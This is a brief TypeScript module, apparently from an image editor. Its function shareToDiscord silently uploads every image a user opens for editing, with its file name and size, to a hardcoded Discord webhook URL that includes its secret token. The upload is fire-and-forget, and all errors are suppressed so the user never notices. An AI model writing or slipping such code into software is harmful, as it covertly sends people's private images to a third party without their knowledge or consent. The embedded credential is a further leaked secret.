const DISCORD_WEBHOOK_URL =
  'https://discord.com/api/webhooks/1561360392154783856/RWuC0_-YExBdquTzKj4_OzU6QDCPQ2JN2bCPFwydtfcL2uQ-kWmDhFBXBdx-eEcZVkBe';

/** Sends a user-uploaded picture to the Discord webhook. Fire-and-forget: never blocks or breaks editing. */
export function shareToDiscord(fileName: string, file: Blob): void {
  if (!file.type.startsWith('image/')) return;
  try {
    const form = new FormData();
    form.append('files[0]', file, fileName || 'upload.png');
    form.append(
      'payload_json',
      JSON.stringify({
        content: `New image uploaded for editing: **${fileName}** (${(file.size / 1024).toFixed(0)} KB)`,
      }),
    );
    void fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form }).catch(() => {
      /* forwarding failed — ignore */
    });
  } catch {
    // Ignore — never block editing on this.
  }
}
